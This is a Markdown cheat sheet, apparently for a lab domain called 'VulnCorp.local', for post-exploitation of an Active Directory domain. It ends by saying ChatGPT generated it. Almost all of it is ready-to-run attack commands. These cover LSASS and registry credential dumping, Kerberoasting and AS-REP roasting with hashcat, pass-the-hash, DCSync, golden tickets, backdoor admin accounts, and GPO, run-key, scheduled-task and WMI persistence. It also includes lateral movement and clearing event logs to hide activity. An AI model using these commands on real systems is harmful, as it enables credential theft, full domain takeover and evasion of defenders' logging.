
# üß† VulnCorp.local - AD DC Post-Exploitation Cheat Sheet

## üîê Initial Access on Domain Member
```powershell
whoami /all
echo %USERDOMAIN%
net config workstation
nltest /dsgetdc:vulncorp.local
```
- Get domain SID:
```powershell
whoami /user
```

## üß≠ Basic Domain Recon
```powershell
net user /domain
net group /domain
net group "Domain Admins" /domain
```
- Using PowerView:
```powershell
Import-Module .\PowerView.ps1
Get-NetUser | select cn
Get-NetGroupMember -GroupName "Domain Admins"
```

## üîë Credential Hunting
- Dump LSASS memory:
```powershell
procdump64.exe -ma lsass.exe lsass.dmp
```
- Analyze with Mimikatz:
```powershell
privilege::debug
sekurlsa::logonpasswords
```
- Dump registry hives:
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

## üß≤ Kerberoasting
```powershell
Get-NetUser -SPN
Add-Type -AssemblyName System.IdentityModel
$creds = Get-Credential
$ticket = Get-DomainSPNTicket -Credential $creds
```
- Crack with hashcat:
```bash
hashcat -m 13100 kerb_hashes.txt rockyou.txt
```

## üî• AS-REP Roasting
```powershell
Get-ASREPHash -Verbose
```
- Crack with hashcat:
```bash
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## üß¨ Pass-the-Hash / Ticket Attacks
- Pass-the-Hash:
```powershell
sekurlsa::pth /user:Administrator /domain:vulncorp.local /ntlm:<hash>
```
- Pass-the-Ticket:
```powershell
kerberos::ptt ticket.kirbi
```
- List tickets:
```powershell
kerberos::list
```

## üß™ DC Sync Attack (Domain Admin)
```powershell
lsadump::dcsync /domain:vulncorp.local /user:krbtgt
```

## üß® Golden Ticket Attack
```powershell
kerberos::golden /user:hacker /domain:vulncorp.local /sid:S-1-5-21-xxxx /krbtgt:<hash> /ptt
```

## ü¶ä Rubeus Examples
- Kerberoast with Rubeus:
```powershell
Rubeus.exe kerberoast /output:hashes.txt
```
- Ask TGT:
```powershell
Rubeus.exe asktgt /user:hacker /rc4:<NTLM hash> /domain:vulncorp.local /ptt
```
- Pass-the-Ticket:
```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
```
- Dump Tickets:
```powershell
Rubeus.exe tgtdeleg
Rubeus.exe dump
```

## üï≥Ô∏è BloodHound Collection
```powershell
Sharphound.exe -c All
```
- Import the zip in BloodHound GUI.

## ü™§ Persistence on Domain

### ‚û§ Add Domain Admin
```powershell
net user hacker Pass123! /add /domain
net group "Domain Admins" hacker /add /domain
```

### ‚û§ Malicious GPO
```powershell
New-GPO -Name "MaliciousPolicy"
Set-GPRegistryValue -Name "MaliciousPolicy" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Type String -Value "C:\backdoor.exe"
```

### ‚û§ PowerShell Persistence Scripts

- Registry Run Key:
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Users\Public\backdoor.exe"
```

- Scheduled Task:
```powershell
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UpdateService" -Description "Backdoor" -User "SYSTEM"
```

- WMI Event Subscription:
```powershell
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "PersistenceFilter"; EventNamespace = "root\cimv2";
    QueryLanguage = "WQL"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
}
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistenceConsumer"; CommandLineTemplate = "C:\Users\Public\backdoor.exe";
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}
```

## üì° Lateral Movement
- WMI:
```powershell
Invoke-WmiMethod -Class Win32_Process -ComputerName <hostname> -Name Create -ArgumentList "cmd.exe /c whoami"
```
- PSExec:
```bash
psexec.py vulncorp.local/hacker:Pass123!@target cmd.exe
```

## üßº Cleanup
```powershell
wevtutil cl Security
wevtutil cl System
net user hacker /del /domain
```

## üìå Recommended Tools
- Mimikatz
- PowerView
- SharpHound / BloodHound
- Rubeus
- Impacket Suite
- CrackMapExec
- hashcat / john

## This is generated by OpenAI chatGPT
